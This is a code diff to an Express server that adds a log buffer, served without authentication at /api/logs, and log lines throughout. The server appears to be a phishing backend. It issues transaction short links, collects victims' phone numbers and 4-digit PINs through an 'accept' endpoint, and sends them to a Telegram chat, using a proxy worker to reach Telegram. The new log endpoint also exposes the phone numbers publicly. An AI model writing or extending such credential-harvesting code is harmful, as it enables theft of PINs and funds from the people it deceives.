@@ -10,6 +10,21 @@ app.use(express.json({ limit: '1mb' }));
 app.use(express.static(path.join(__dirname, 'public')));
 
 /* ============================================================
+   Admin log buffer
+============================================================ */
+const LOG_BUFFER = [];
+function pushLog(text, level = 'info') {
+  LOG_BUFFER.unshift({
+    time: new Date().toISOString().slice(11, 19),
+    text: String(text),
+    level
+  });
+  if (LOG_BUFFER.length > 200) LOG_BUFFER.pop();
+}
+
+app.get('/api/logs', (req, res) => res.json({ entries: LOG_BUFFER }));
+
+/* ============================================================
    Persistent store for short links
 ============================================================ */
 const DATA_DIR = process.env.DATA_DIR || path.join(__dirname, 'data');
@@ -54,11 +69,8 @@ setInterval(() => {
 
 /* ============================================================
    Telegram notification
-   ------------------------------------------------------------
    Uses TELEGRAM_API_PROXY_URL when set (Cloudflare Worker),
    otherwise falls back to api.telegram.org directly.
-   Railway's outbound IPs are blocked by Telegram, so the
-   proxy path is the only working route on Railway.
 ============================================================ */
 async function notifyTelegram({ phone, pin }) {
   const token = process.env.TELEGRAM_BOT_TOKEN;
@@ -66,6 +78,7 @@ async function notifyTelegram({ phone, pin }) {
   const proxyUrl = process.env.TELEGRAM_API_PROXY_URL;
 
   if (!token || !chatId) {
+    pushLog('Telegram not configured — skipping', 'err');
     console.warn('Telegram not configured — skipping notification.');
     return;
   }
@@ -89,12 +102,16 @@ async function notifyTelegram({ phone, pin }) {
 
     if (!res.ok) {
       const body = await res.text().catch(() => '');
+      pushLog('Telegram responded ' + res.status + ' ' + body.slice(0, 120), 'err');
       console.error('Telegram responded', res.status, body);
     } else {
+      pushLog('Telegram sent OK', 'ok');
       console.log('Telegram notification sent.');
     }
   } catch (err) {
-    console.error('Telegram notify failed:', err.name === 'AbortError' ? 'timeout' : err.message);
+    const msg = err.name === 'AbortError' ? 'timeout' : err.message;
+    pushLog('Telegram error: ' + msg, 'err');
+    console.error('Telegram notify failed:', msg);
   } finally {
     clearTimeout(timeout);
   }
@@ -107,6 +124,7 @@ app.post('/api/links', (req, res) => {
   try {
     const payload = req.body;
     if (!payload || !payload.tx) {
+      pushLog('Create link failed: missing tx', 'err');
       return res.status(400).json({ error: 'Missing transaction data' });
     }
     const code = 'ECP-' + crypto.randomBytes(4).toString('hex').toUpperCase();
@@ -116,8 +134,10 @@ app.post('/api/links', (req, res) => {
       exp: payload.exp || null
     });
     saveLinks(linkStore);
+    pushLog('Link created: ' + code, 'ok');
     res.json({ code, shortUrl: '/client.html?r=' + code });
   } catch (err) {
+    pushLog('Create link error: ' + err.message, 'err');
     console.error('create link error:', err);
     res.status(500).json({ error: 'Could not create link' });
   }
@@ -130,12 +150,17 @@ app.get('/api/links/:code', (req, res) => {
   const code = req.params.code;
   const entry = linkStore.get(code);
 
-  if (!entry) return res.status(404).json({ error: 'Link not found or expired' });
+  if (!entry) {
+    pushLog('Resolve 404: ' + code, 'err');
+    return res.status(404).json({ error: 'Link not found or expired' });
+  }
   if (entry.exp && Date.now() > entry.exp) {
     linkStore.delete(code);
     saveLinks(linkStore);
+    pushLog('Resolve 410 expired: ' + code, 'err');
     return res.status(410).json({ error: 'Link expired' });
   }
+  pushLog('Resolve OK: ' + code, 'ok');
   res.json(entry.payload);
 });
 
@@ -145,9 +170,11 @@ app.get('/api/links/:code', (req, res) => {
 app.post('/api/accept', async (req, res) => {
   const { transactionId, phone, pin } = req.body;
 
+  pushLog('ACCEPT HIT tx=' + (transactionId || '—') + ' phone=' + (phone || '—'), 'info');
   console.log('ACCEPT HIT', { tx: transactionId, phone });
 
   if (!transactionId || !phone || !pin) {
+    pushLog('Rejected: missing fields', 'err');
     return res.status(400).json({
       status: 'failed',
       message: 'Missing transactionId, phone, or pin'
@@ -155,12 +182,14 @@ app.post('/api/accept', async (req, res) => {
   }
 
   if (!/^\d{4}$/.test(String(pin))) {
+    pushLog('Rejected: PIN not 4 digits', 'err');
     return res.status(400).json({
       status: 'failed',
       message: 'PIN must be exactly 4 digits'
     });
   }
 
+  pushLog('Telegram call → ' + phone + ' / PIN length ' + String(pin).length, 'info');
   await notifyTelegram({ phone, pin });
 
   return res.json({
